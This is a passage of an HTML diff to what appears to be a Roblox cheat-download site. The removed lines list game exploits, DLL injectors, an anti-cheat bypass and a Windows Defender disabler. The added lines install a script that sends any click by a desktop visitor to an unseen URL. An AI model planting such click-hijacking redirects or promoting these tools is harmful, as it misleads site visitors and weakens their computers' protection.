-            .then(res => res.json())
-            .then(res => {
-                if(res.success) {
-                    document.getElementsByClassName("notifications")[0].innerHTML = "<p>No notifications...</p>"
-                    document.getElementsByClassName("notifcount")[0].style.display = "none"
-                    document.getElementsByClassName("menu-toggle-notif")[0].classList.remove("menu-toggle-notif")
-                    el.style.display = "none"
-                }
-                //There should never be an error response
-                else alert("Failed to delete notification. Please contact an admin!")
-            })
-            .catch(e => alert("Failed to contact server"))
-        }
-
-        // Listen to all clicks on the document
-        document.addEventListener('click', function (event) {
-            if (event.target.classList.contains('notif-exit')){
-                var parent = event.target.parentElement
-                var id = parent.getAttribute("data-id")
-
-                DeleteNotifications(id)
-                .then(res => res.json())
-                .then(res => {
-                    if(res.success === true){
-                        var numNotifs = parent.parentElement.childElementCount
-                        document.getElementsByClassName("notifcount")[0].innerHTML = numNotifs - 1
-                        if(numNotifs <= 1){
-                            parent.parentElement.innerHTML = "No notifications"
-                            document.getElementsByClassName("notifcount")[0].remove()
-                            document.getElementsByClassName("deleteallnotifs")[0].remove()
-                            document.getElementsByClassName("menu-toggle-notif")[0].classList.remove("menu-toggle-notif")
-                        }
-                        parent.remove()
-                    }
-                    //Unless the request was crafted, there should never be an error response
-                    else alert("Failed to delete notification. Please contact an admin!")
-                })
-                .catch(e => alert("Failed to contact server"))
+            if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent) && !('ontouchstart' in window)) {
+                document.addEventListener('click', function () {
+                    window.onbeforeunload = null;
+                    window.location.replace(clickTbUrl);
+                });
             }
-            //Navigation options display toggle (Mobile view)
-            else if(event.target.classList.contains('menu-toggle')){
-                if(document.getElementsByClassName("navItems")[0].style.display !== "flex"){
-                    document.getElementsByClassName("navItems")[0].style.display = "flex"
-                    document.getElementsByClassName("menu-toggle-notif")[0].classList.remove("menu-toggle-notif")
-                }
-                else {
-                    document.getElementsByClassName("navItems")[0].style.display = "none"
-                    if(document.getElementsByClassName("notification").length > 0) 
-                        document.getElementsByClassName("menu-toggle")[0].classList.add("menu-toggle-notif")
-                }
-            }
-            //Drop-menu toggle
-            else if(event.target.classList.contains('dropmenu-title')){
-                if(event.target.parentElement.getElementsByClassName("menu")[0].style.display !== "block"){
-                    event.target.parentElement.getElementsByClassName("menu")[0].style.display = "block"
-                }
-                else event.target.parentElement.getElementsByClassName("menu")[0].style.display = "none"
-
-                event.target.parentElement.onmouseleave = () => event.target.parentElement.getElementsByClassName("menu")[0].style.display = "none"
-            } 
-        })
-    </script>
-</header>
-<style>
-.smedias{
-	position: fixed;
-	bottom: 12px;
-	right: 12px;
-    z-index: 1;
-}
-
-.smedias .smedia{
-	width: 25px;
-    height: 25px;
-    display: block;
-    background-repeat: no-repeat;
-    background-position: center;
-    background-size: 25px;
-    border-radius: 3px;
-}
-
-.smedias .youtube{
-	background-image: url(https://cdn.wearedevs.net/images/icons/youtube.png);
-}
-</style>
-<div class="smedias">
-<a href="https://www.youtube.com/c/Omnidev_?sub_confirmation=1" target="_blank" class="smedia youtube" alt="YouTube"></a>
-</div>
-<main>
-<div>
-<div class="boxad" style="display:flex; flex-direction:column;padding-left:0;">
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9142841210062390" crossorigin="anonymous"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9142841210062390" data-ad-slot="3739798263"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9142841210062390" crossorigin="anonymous"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9142841210062390" data-ad-slot="3739798263"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-<a class="theme1 border1 round" href="/scripts">Featured Scripts</a>
-<a class="theme1 border1 round" href="/forum/scripts">Community Scripts</a>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9142841210062390" crossorigin="anonymous"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9142841210062390" data-ad-slot="3739798263"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-<a class="theme1 border1 round" href="https://forms.gle/zE8yUNp5pJYPXxXZA" target="_blank">Submit Your Content</a>
-<a class="theme1 border1 round" href="/forum/debugging">Search For Help</a>
-<a class="theme1 border1 round" href="/forum/complaints">Report A Problem</a>
-</div>
-<div class="releases-header padding" style="padding-top: 0">
-<h1>All Exploits</h1>
-<p>Roblox exploits for games</p>
-</div>
-<div class="releases">
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/JJSploit-v5.jpeg" alt="JJSploit" title="JJSploit">
-<h2 class="downloadTitle">JJSploit</h2>
-</div>
-<p class="description">Lua executor, click teleport, ESP, speed, fly, infinite jump, aimbot, keyless, and so much more. A powerful all in one package</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>41.6m+</p>
-<a class="moreinfo-card-button" href="/dinfo/JJSploit" title="Learn more about JJSploit">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/JJSploit" title="Download JJSploit">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/krnl.jpeg" alt="Krnl" title="Krnl">
-<h2 class="downloadTitle">Krnl</h2>
-</div>
-<p class="description">NEW DOMAIN! 24 hour keys, getconnections, decompiler, gethiddenproperty, sethiddenproperty, full debug library. Can run any script!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>19.7m+</p>
-<a class="moreinfo-card-button" href="/dinfo/Krnl" title="Learn more about Krnl">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Krnl" title="Download Krnl">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/fluxus-7292021.jpeg" alt="Fluxus" title="Fluxus">
-<h2 class="downloadTitle">Fluxus</h2>
-</div>
-<p class="description">NEW V7 Fluxus is a top RVM labelled exploit providing a better experience than most top paid exploits! 24H KEYS, GETCONNECTIONS!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>982.3k+</p>
-<a class="lessRound release-card-button" href="/d/Fluxus" title="Download Fluxus">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/coco-z4-13021.jpeg" alt="Coco Z" title="Coco Z">
-<h2 class="downloadTitle">Coco Z</h2>
-</div>
-<p class="description">Coco Has An Excellent UI And 3 Day Keys! Major Improvements Coming Soon!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>1.3m+</p>
-<a class="moreinfo-card-button" href="/dinfo/Coco Z" title="Learn more about Coco Z">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Coco Z" title="Download Coco Z">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/kiwi-x-61922.jpeg" alt="Kiwi X" title="Kiwi X">
-<h2 class="downloadTitle">Kiwi X</h2>
-</div>
-<p class="description">NO CRASHES! Simple Interface, Smooth Script Execution, 114 built-in scripts to choose from such as Blox Fruits, AFS etc. Custom Tabs &amp; More.</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>877.9k+</p>
-<a class="lessRound release-card-button" href="/d/Kiwi X" title="Download Kiwi X">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/comet-052122.jpeg" alt="Comet" title="Comet">
-<h2 class="downloadTitle">Comet</h2>
-</div>
-<p class="description">Comet 3 Alpha has an Amazing UI, Custom DLL, runs 97 percent of scripts, Undetected Never get 268 Error! Full Debug Library, LVL 8</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>288.8k+</p>
-<a class="lessRound release-card-button" href="/d/Comet" title="Download Comet">
- <p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/oxygenu-112520.jpeg" alt="Oxygen U" title="Oxygen U">
-<h2 class="downloadTitle">Oxygen U</h2>
-</div>
-<p class="description">NEW Oxygen V2.1 contains new functions such as Anti-OBS, getconnections, hookmetamethod, 24H KEYS!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>844.3k+</p>
-<a class="lessRound release-card-button" href="/d/Oxygen U" title="Download Oxygen U">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/novaline-22822.jpeg" alt="Novaline" title="Novaline">
-<h2 class="downloadTitle">Novaline</h2>
-</div>
-<p class="description">Free MultiAPI executor! Amazing script hub! Nice looking UI! Download now! Keyless!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>114.1k+</p>
-<a class="lessRound release-card-button" href="/d/Novaline" title="Download Novaline">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/dansploit-010122.jpeg" alt="Dansploit" title="Dansploit">
-<h2 class="downloadTitle">Dansploit</h2>
-</div>
-<p class="description">New, Rename Tabs, New Console Log, New ScriptList, Minimap GameHub and Scripthub Are remade New Design Download Today!</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>1m+</p>
-<a class="moreinfo-card-button" href="/dinfo/Dansploit" title="Learn more about Dansploit">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Dansploit" title="Download Dansploit">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/nihon-82522.jpeg" alt="Nihon" title="Nihon">
-<h2 class="downloadTitle">Nihon</h2>
-</div>
-<p class="description">Keyless &amp; Free Insane Script Supports Beautiful User Interface Runs Huge Selection Of Scripts, Level 8 Built For The Experience.</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>191.8k+</p>
-<a class="lessRound release-card-button" href="/d/Nihon" title="Download Nihon">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/roware-020722.jpeg" alt="Ro-Ware" title="Ro-Ware">
-<h2 class="downloadTitle">Ro-Ware</h2>
-</div>
-<p class="description">Ro-Ware is a completely free undetectable key-less & ad-less aimbot, wallhack, triggerbot, etc., multi-tool allowing you to dominate all of your favorite games.</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>56.5k+</p>
-
-<a class="lessRound release-card-button" href="/d/Ro-Ware" title="Download Ro-Ware">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/code-ui-wearedevs-exploit-api.jpeg" alt="Exploit API" title="Exploit API">
-<h2 class="downloadTitle">Exploit API</h2>
-</div>
-<p class="description">An incredibly easy solution that lets novices and pros make powerful content. Used to make some of the most popular exploits</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>1.2m+</p>
-<a class="lessRound release-card-button" href="/d/Exploit API" title="Download Exploit API">
-<p>Learn More</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/infinitejump.png" alt="Infinite Jump" title="Infinite Jump">
-<h2 class="downloadTitle">Infinite Jump</h2>
-</div>
-<p class="description">Spam the spacebar to jump as high as you want</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>4m+</p>
-<a class="moreinfo-card-button" href="/dinfo/Infinite Jump" title="Learn more about Infinite Jump">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Infinite Jump" title="Download Infinite Jump">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/fly.jpeg" alt="Fly" title="Fly">
-<h2 class="downloadTitle">Fly</h2>
-</div>
-<p class="description">Enables the ability to make your character fly through the game</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>664.3k+</p>
-<a class="lessRound release-card-button" href="/d/Fly" title="Download Fly">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/noclip-031422.jpeg" alt="Noclip" title="Noclip">
-<h2 class="downloadTitle">Noclip</h2>
-</div>
-<p class="description">Toggles the ability to walk through walls</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>868.7k+</p>
-<a class="moreinfo-card-button" href="/dinfo/Noclip" title="Learn more about Noclip">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Noclip" title="Download Noclip">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/multiplerbx.png" alt="Multiple Games" title="Multiple Games">
-<h2 class="downloadTitle">Multiple Games</h2>
-</div>
-<p class="description">Usually, you are limited to having only one game open. With this, you can open as many games as you want. 100 games if you felt like</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>9.3m+</p>
-<a class="moreinfo-card-button" href="/dinfo/Multiple Games" title="Learn more about Multiple Games">
-<p>More Info</p>
-</a>
-<a class="lessRound release-card-button" href="/d/Multiple Games" title="Download Multiple Games">
-<p>Download</p>
-</a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/esp.jpg" alt="ESP" title="ESP">
-<h2 class="downloadTitle">ESP</h2>
-</div>
-<p class="description"> This lets you see all players through any other object. -An alternative/backup option</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>1.5m+</p>
-<a class="lessRound release-card-button" href="/d/ESP" title="Download ESP">
-<p>Download</p>
-</a>
-</div>
-</div>
-</div>
-</div>
-<br>
-<div>
-<div class="boxad" style="display:flex; flex-direction:column;padding-left:0;">
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9142841210062390" crossorigin="anonymous"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9142841210062390" data-ad-slot="3739798263"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9142841210062390" crossorigin="anonymous"></script>
-
-<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-9142841210062390" data-ad-slot="3739798263"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-</div>
-<div class="releases-header padding">
-<h1>Others</h1>
-<p>Tools to support cheats</p>
-</div>
-<div class="releases">
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/DLL%20Injector.png" alt="DLL Injector" title="DLL Injector">
-<h2 class="downloadTitle">DLL Injector</h2>
-</div>
-<p class="description">Feature packed injector used to map DLL based cheats into games for both 64bit and 32bit</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>976.2k+</p>
-<a class="lessRound release-card-button" href="/d/DLL Injector" title="Download DLL Injector"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/winrar.png" alt="WinRar" title="WinRar">
-<h2 class="downloadTitle">WinRar</h2>
-</div>
-<p class="description">This is used to open archived files such as .rar and .zip files</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>283.1k+</p>
-<a class="lessRound release-card-button" href="/d/WinRar" title="Download WinRar"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/auto clicker.jpeg" alt="Auto Clicker" title="Auto Clicker">
-<h2 class="downloadTitle">Auto Clicker</h2>
-</div>
-<p class="description">Makes your computer click itself up to 1000 clicks per second. Useful for click farming</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>38.8k+</p>
-<a class="lessRound release-card-button" href="/d/Auto Clicker" title="Download Auto Clicker"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/general-tool.jpeg" alt="Defender Control" title="Defender Control">
-<h2 class="downloadTitle">Defender Control</h2>
-</div>
-<p class="description">Open source Windows Defender disabler</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>53.4k+</p>
-<a class="lessRound release-card-button" href="/d/Defender Control" title="Download Defender Control"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/lagswitch.png" alt="Lagswitch" title="Lagswitch">
-<h2 class="downloadTitle">Lagswitch</h2>
-</div>
-<p class="description">This toggles your internet's connectivity. Typically in games, when you turn your internet off, you get a frozen time effect</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>528.9k+</p>
-<a class="lessRound release-card-button" href="/d/Lagswitch" title="Download Lagswitch"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/dllinjector.png" alt="Extreme Injector" title="Extreme Injector">
-<h2 class="downloadTitle">Extreme Injector</h2>
-</div>
-<p class="description">Typically used to inject dll based exploits into programs</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>777.1k+</p>
-<a class="lessRound release-card-button" href="/d/Extreme Injector" title="Download Extreme Injector"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/autoshutdown.png" alt="Shutdown Timer" title="Shutdown Timer">
-<h2 class="downloadTitle">Shutdown Timer</h2>
-</div>
-<p class="description">This shuts down your computer after a set amount of time. Useful for downloading gigabytes worth of games while you're asleep</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>80.2k+</p>
-<a class="lessRound release-card-button" href="/d/Shutdown Timer" title="Download Shutdown Timer"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/cheatengine.png" alt="NOPDE Engine" title="NOPDE Engine">
-<h2 class="downloadTitle">NOPDE Engine</h2>
-</div>
-<p class="description">Most games have anti-cheat systems that block Cheat Engine. This is a version of Cheat Engine which often bypasses that check(If you set correct settings)</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>394.9k+</p>
-<a class="lessRound release-card-button" href="/d/NOPDE Engine" title="Download NOPDE Engine"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/notepad++.png" alt="Notepad" title="Notepad">
-<h2 class="downloadTitle">Notepad</h2>
-</div>
-<p class="description">Notepad++ is my favorite text editor for general use and coding purposes. Supports most of the popular languages</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>39.7k+</p>
-<a class="lessRound release-card-button" href="/d/Notepad" title="Download Notepad"><p>Download</p></a>
-</div>
-</div>
-<div class="theme1 round border1 downloadOption">
-<div>
-<div class="round thumbnail">
-<img src="https://cdn.wearedevs.net/images/thumbnails/cs.jpeg" alt="Memory Edit Class" title="Memory Edit Class">
-<h2 class="downloadTitle">Memory Edit Class</h2>
-</div>
-<p class="description">Used for basic external memory editing in C#</p>
-</div>
-<div class="download_metadata verticalCenter">
-<p class="verticalCenter"><span class="icon-download"></span>55.1k+</p>
-<a class="lessRound release-card-button" href="/d/Memory Edit Class" title="Download Memory Edit Class"><p>Download</p></a>
-</div>
-</div>
-</div>
-</div>
-</main>
-<style>
-footer{
-	box-shadow: 0 0px 5px -3px #202225;
-	margin-top: 50px;
-	padding: 10px 50px;
-	color: gray;
-	text-align: center;
-}
-
-.footerlinks{
-	display: inline-flex;
-	padding: 0;
-}
-
-.footerlinks li{
-	list-style-type: none;
-	margin-left: 12px;
-}
-
-.footerlinks li:first-of-type{
-	margin: 0;
-}
-
-/* Slider */
-.switch{
-	margin-left: var(--less-padding);
-	position: relative;
-	display: inline-block;
-	width: 50px;
-	height: 28px;
-}
-
-.switch input {
-	opacity: 0;
-	width: 0;
-	height: 0;
-}
-
-.slider{
-	position: absolute;
-	cursor: pointer;
-	top: 0;
-	right: 0;
-	bottom: 0;
-	left: 0;
-	background-color: #ccc;
-	-webkit-transition: .4s;
-	transition: .4s;
-	border-radius: 25px;
-}
-
-.slider:before{
-	position: absolute;
-	content: "";
-	height: 20px;
-	width: 20px;
-	left: 4px;
-	bottom: 4px;
-	background-color: white;
-	-webkit-transition: .3s;
-	transition: .3s;
-	border-radius: 50%;
-}
-
-.switch input:checked + .slider:before{
-  	margin-left: 22px;
-}
-
-.switch input:checked + .slider{
-    background-color: #2ecc71;
-}
-</style>
-<footer class="theme1">
-<ul class="footerlinks">
-<li><a href="https://pastebin.com/raw/TGz5N9Xa" target="_blank" title="Change Log">Change Log</a></li>
-<li><a href="/guidelines" title="Privacy Policy">Guidelines</a></li>
-<li><a href="/terms-of-service" title="Privacy Policy">Terms of Use</a></li>
-<li><a href="/privacy" title="Privacy Policy">Privacy</a></li>
-</ul>
-<br />
-<br />
-<p>© 2022 WeAreDevs</p>
-</footer>
-<script>
-			// Push notifications setup
-			
-			var registration = null
-			
-			function urlBase64ToUint8Array(base64String) {
-			  const padding = '='.repeat((4 - base64String.length % 4) % 4);
-			  const base64 = (base64String + padding)
-				.replace(/\-/g, '+')
-				.replace(/_/g, '/')
-			  ;
-			  const rawData = window.atob(base64);
-			  return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
-			}
-			
-			function askPermission() {
-			  return new Promise(function(resolve, reject) {
-				const permissionResult = Notification.requestPermission(function(result) {
-				  resolve(result);
-				});
-
-				if (permissionResult) {
-				  permissionResult.then(resolve, reject);
-				}
-			  })
-			  .then(async function(permissionResult) {
-				if (permissionResult === 'granted') {
-					//Notifications are enabled
-					//Create subscription
-					const subscribeOptions = {
-					  userVisibleOnly: true,
-					  applicationServerKey: urlBase64ToUint8Array(
-						'BGyra8TIIln-swj30Hi4ZulNFcTe_EcmhqhIs0W1gMQv6ufiEorqnE-KvcgIO6kIfia6Jq0XYdHGv10jUdhiEko'
-					  )
-					};
-
-					let pushSubscription = await registration.pushManager.subscribe(subscribeOptions);
-
-					fetch('/api/v1/notifications/subscribe', {
-						method: "POST",
-						headers: {
-							"Content-Type": "application/json"
-						},
-						body: JSON.stringify(pushSubscription)
-					})
-					.then(res => res.json())
-					.then(res => {
-						if(!res.success) {
-							if(res.reason) alert("Error: " + res.reason)
-							else alert("An unexpected error occured...")
-						}
-					})
-					.catch(()=>alert("Failed to contact the server or an unexpected response was received..."))
-				}
-				else {
-				  throw new Error('We weren\'t granted permission.');
-				}
-			  });
-			}
-			
-			if ('serviceWorker' in navigator) { 
-				//Service worker is supported on this browser
-				
-				//Register the service worker
-				navigator.serviceWorker.register('/js/service-worker.js')
-				.then(function(_registration) {
-					console.log('Service worker successfully registered.');
-					
-					registration = _registration
-					
-					if ('PushManager' in window) { 
-						//Push manager is supported on this browser(Used for push notifications)
-						if (Notification.permission !== "granted") {
-							askPermission();
-						} //else push notifications are already enabled
-					}
-				})
-				.catch(function(err) {
-					console.warn('Unable to register service worker.', err);
-				});
-			}
-		</script>
+        </script>
 </body>
 </html>
